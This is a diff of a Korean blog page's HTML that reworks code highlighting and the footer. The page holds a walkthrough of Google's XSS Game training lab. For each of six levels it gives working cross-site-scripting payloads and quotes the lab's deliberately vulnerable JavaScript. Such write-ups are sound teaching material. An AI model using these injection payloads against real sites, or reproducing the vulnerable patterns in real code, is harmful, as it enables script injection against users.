@@ -108,7 +108,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <body>
     
 
-<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+<header id="l_header" class="l_header always shadow blur show"  >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -389,33 +389,131 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   
   <p>홈페이지 : <a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p>
-<h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><pre><code class="html">&lt;svg onload=alert(1)&gt;</code></pre>
 <hr>
-<h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><pre><code class="html">&lt;img src=&quot;#&quot; onerror=alert(1)&gt;</code></pre>
 <p>onerror 이벤트 핸들러로 alert를 띄워줄 수 있다.</p>
 <hr>
-<h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">    &lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">chooseTab</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Dynamically load the appropriate image.</span></span><br><span class="line">        <span class="keyword">var</span> html = <span class="string">&quot;Image &quot;</span> + <span class="built_in">parseInt</span>(num) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        html += <span class="string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line">        $(<span class="string">&#x27;#tabContent&#x27;</span>).html(html);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">window</span>.location.hash = num;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Select the current tab</span></span><br><span class="line">        <span class="keyword">var</span> tabs = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.length; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (tabs[i].id == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(num)) &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Tell parent we&#x27;ve changed the tab</span></span><br><span class="line">        top.postMessage(self.location.toString(), <span class="string">&quot;*&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)) || <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Extra code so that we can communicate with the parent page</span></span><br><span class="line">      <span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (event.source == parent) &#123;</span><br><span class="line">          chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, <span class="literal">false</span>);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;img src=<span class="string">&#x27;/static/level3/cloud&quot; + num + &quot;.jpg&#x27;</span> /&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><pre><code class="js">    &lt;script&gt;
+      function chooseTab(num) &#123;
+        // Dynamically load the appropriate image.
+        var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;;
+        html += &quot;&lt;img src=&#39;/static/level3/cloud&quot; + num + &quot;.jpg&#39; /&gt;&quot;;
+        $(&#39;#tabContent&#39;).html(html);
+
+        window.location.hash = num;
+
+        // Select the current tab
+        var tabs = document.querySelectorAll(&#39;.tab&#39;);
+        for (var i = 0; i &lt; tabs.length; i++) &#123;
+          if (tabs[i].id == &quot;tab&quot; + parseInt(num)) &#123;
+            tabs[i].className = &quot;tab active&quot;;
+            &#125; else &#123;
+            tabs[i].className = &quot;tab&quot;;
+          &#125;
+        &#125;
+
+        // Tell parent we&#39;ve changed the tab
+        top.postMessage(self.location.toString(), &quot;*&quot;);
+      &#125;
+
+      window.onload = function() &#123; 
+        chooseTab(unescape(self.location.hash.substr(1)) || &quot;1&quot;);
+      &#125;
+
+      // Extra code so that we can communicate with the parent page
+      window.addEventListener(&quot;message&quot;, function(event)&#123;
+        if (event.source == parent) &#123;
+          chooseTab(unescape(self.location.hash.substr(1)));
+        &#125;
+      &#125;, false);
+    &lt;/script&gt;
+&lt;img src=&#39;/static/level3/cloud&quot; + num + &quot;.jpg&#39; /&gt;</code></pre>
 <p>chooseTab 함수가 호출될 때, 위와 같이 img 태그를 사용하고 있다.</p>
 <p>여기서 onerror event handler 사용할려면 #framenum.jpg’ onerror=~ 와 같이 페이로드를 완성해주면 된다.</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frame#4.jpg&#x27; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="html">frame#4.jpg&#39; onerror=alert(1)&gt;</code></pre>
 <hr>
-<h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    &lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">startTimer</span>(<span class="params">seconds</span>) </span>&#123;</span><br><span class="line">        seconds = <span class="built_in">parseInt</span>(seconds) || <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">          <span class="built_in">window</span>.confirm(<span class="string">&quot;Time is up!&quot;</span>);</span><br><span class="line">          <span class="built_in">window</span>.history.back();</span><br><span class="line">        &#125;, seconds * <span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;/static/loading.gif&quot;</span> onload=<span class="string">&quot;startTimer(&#x27;&#123;&#123; timer &#125;&#125;&#x27;);&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><pre><code class="js">    &lt;script&gt;
+      function startTimer(seconds) &#123;
+        seconds = parseInt(seconds) || 3;
+        setTimeout(function() &#123; 
+          window.confirm(&quot;Time is up!&quot;);
+          window.history.back();
+        &#125;, seconds * 1000);
+      &#125;
+    &lt;/script&gt;
+&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#123;&#123; timer &#125;&#125;&#39;);&quot; /&gt;</code></pre>
 <p>타이머 호출 스크립트이다, 그냥 입력한 숫자만큼 타이머가 돌아가는 구조라서 딱히 건드릴 부분은 없다.</p>
 <p>하지만, 위 부분을 보면 onload event handler 로 스크립트를 실행하고 있다.</p>
 <p>즉, onload 부분을 이용해서 alert를 띄워주면 된다.</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timer=1&#x27;);alert(&#x27;1</span><br></pre></td></tr></table></figure>
+<pre><code class="html">timer=1&#39;);alert(&#39;1</code></pre>
 <hr>
-<h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level5&quot;</span>&gt;</span></span><br><span class="line">  Welcome! Today we are announcing the much anticipated<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level5.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/level5/frame/signup?next=confirm&quot;</span>&gt;</span>Sign up<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">  for an exclusive Beta.</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><pre><code class="html">&lt;body id=&quot;level5&quot;&gt;
+  Welcome! Today we are announcing the much anticipated&lt;br&gt;&lt;br&gt;
+  &lt;img src=&quot;/static/logos/level5.png&quot; /&gt;&lt;br&gt;&lt;br&gt;
+
+  &lt;a href=&quot;/level5/frame/signup?next=confirm&quot;&gt;Sign up&lt;/a&gt; 
+  for an exclusive Beta.
+&lt;/body&gt;</code></pre>
 <p>welcome.html 에서 sign up 페이지로 넘어가는 과정을 보면 ?next= 파라미터에 confirm 값을 담아서 a 태그로 페이지를 넘긴다.</p>
 <p>여기서 보면 get 방식으로 값이 넘어오기 때문에 next= 에 대한 값을 바꿀 수 있게 된다.</p>
 <p>즉, href 속성 값의 next= 파라미터의 값을 통해 alert 팝업을 실행해야 하는데, a 태그에서의 javascript 실행은 다음과 같이 구성된다.</p>
 <p>javascript:alert(1)</p>
 <p>그래서 next=javascript:alert(1) 를 입력해주면 next 버튼을 클릭했을 때 자바스크립트 팝업창이 실행된다.</p>
 <hr>
-<h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setInnerText</span>(<span class="params">element, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (element.innerText) &#123;</span><br><span class="line">    element.innerText = value;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    element.textContent = value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">includeGadget</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> scriptEl = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// This will totally prevent us from loading evil URLs!</span></span><br><span class="line">  <span class="keyword">if</span> (url.match(<span class="regexp">/^https?:\/\//</span>)) &#123;</span><br><span class="line">    setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),</span><br><span class="line">      <span class="string">&quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load this awesome gadget</span></span><br><span class="line">  scriptEl.src = url;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Show log messages</span></span><br><span class="line">  scriptEl.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span><br><span class="line">      <span class="string">&quot;Loaded gadget from &quot;</span> + url);</span><br><span class="line">  &#125;</span><br><span class="line">  scriptEl.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span><br><span class="line">      <span class="string">&quot;Couldn&#x27;t load gadget from &quot;</span> + url);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">document</span>.head.appendChild(scriptEl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Take the value after # and use it as the gadget filename.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getGadgetName</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>) || <span class="string">&quot;/static/gadget.js&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">includeGadget(getGadgetName());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Extra code so that we can communicate with the parent page</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.source == parent) &#123;</span><br><span class="line">    includeGadget(getGadgetName());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><pre><code class="js">&lt;script&gt;
+function setInnerText(element, value) &#123;
+  if (element.innerText) &#123;
+    element.innerText = value;
+  &#125; else &#123;
+    element.textContent = value;
+  &#125;
+&#125;
+
+function includeGadget(url) &#123;
+  var scriptEl = document.createElement(&#39;script&#39;);
+
+  // This will totally prevent us from loading evil URLs!
+  if (url.match(/^https?:\/\//)) &#123;
+    setInnerText(document.getElementById(&quot;log&quot;),
+      &quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;);
+    return;
+  &#125;
+
+  // Load this awesome gadget
+  scriptEl.src = url;
+
+  // Show log messages
+  scriptEl.onload = function() &#123; 
+    setInnerText(document.getElementById(&quot;log&quot;),  
+      &quot;Loaded gadget from &quot; + url);
+  &#125;
+  scriptEl.onerror = function() &#123; 
+    setInnerText(document.getElementById(&quot;log&quot;),  
+      &quot;Couldn&#39;t load gadget from &quot; + url);
+  &#125;
+
+  document.head.appendChild(scriptEl);
+&#125;
+
+// Take the value after # and use it as the gadget filename.
+function getGadgetName() &#123; 
+  return window.location.hash.substr(1) || &quot;/static/gadget.js&quot;;
+&#125;
+
+includeGadget(getGadgetName());
+
+// Extra code so that we can communicate with the parent page
+window.addEventListener(&quot;message&quot;, function(event)&#123;
+  if (event.source == parent) &#123;
+    includeGadget(getGadgetName());
+  &#125;
+&#125;, false);
+
+&lt;/script&gt;</code></pre>
 <p>마지막 문제이다, 전체적인 코드가 좀 긴데 보면은 url.match 로 https 값이 있는지 검증해서 필터링한다.</p>
 <p>그렇다고 http를 넣어서 하면은 http를 포함할 수 없다고 오류 메세지를 친절하게 반환해준다.</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;값&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="js">&lt;script src=&quot;값&quot;&gt;&lt;/script&gt;</code></pre>
 <p>위 조건을 통과하고 나면 script를 호출하게 되는데 위와 같이 실행된다.</p>
 <p>문제의 의도대로 풀려면 힌트에서 주어지는 google api 를 통해서 보면 되는데, https ://google.com/jsapi?callback=foo 여기서 함수 호출 과정을 보니 callback 파리미터로 넘어온 변수를 실행시켜주고 있다.</p>
 <p>그렇기에 callback 파라미터로 alert를 날려주면 alert(); 이 실행될 것 이다.</p>
@@ -427,6 +525,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     <div class='footer'>
       
+      
+        
+  <div class="related_posts">
+    <section class='header'>
+      <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
+    </section>
+    <section class='body'>
+      <div class="vlts-rps"><a class="item" href="/2020/05/26/browser-auditor-200526/" title="Browser Auditor 기술 발표 자료" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">Browser Auditor 기술 발표 자료</span></a><a class="item" href="/2020/02/05/xsscheatsheet-200205/" title="xss cheatsheet 2020" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">xss cheatsheet 2020</span></a><a class="item" href="/2020/04/22/jwtinjection-200422/" title="JWT None Type Injection" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">JWT None Type Injection</span></a></div></section></div>
       
       
       
@@ -440,10 +546,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-17T18:01:08+09:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-22T00:00:00+09:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>EditJan 17, 2021</p>
+    <p>EditApr 22, 2020</p>
   </a>
 </div>
 
@@ -483,7 +589,8 @@ Notion : https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b546
       
         <a class='next' href='/2020/04/10/angstormctf-200410/'>
           <p class='title'>angstorm ctf 2020 Write up<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>1. [WEB - The Magic Word]12345678910&lt;script&gt;    var msg = document.getElementById(&quot;mag...</p>
+          <p class='content'>1. [WEB - The Magic Word]&lt;script&gt;
+    var msg = document.getElementById(&quot;magic&quot;);...</p>
         </a>
       
     </div>
@@ -562,42 +669,6 @@ Notion : https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b546
   
   <footer class="footer clearfix">
     <br><br>
-    
-      
-        <div class="aplayer-container">
-          
-
-
-        </div>
-      
-    
-      
-        <br>
-        <div class="social-wrapper">
-          
-            
-          
-            
-          
-            
-          
-        </div>
-      
-    
-      
-        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
-</div>
-      
-    
-      
-        
-      
-    
-      
-        Use
-        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.0" target="_blank" class="codename">Volantis</a>
-        as theme
-      
     
       
         <div class='copyright'>
@@ -733,6 +804,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
+  
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1108,6 +1181,20 @@ $(function () {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	});
+},"highlightjs")
+</script>
 
 
 
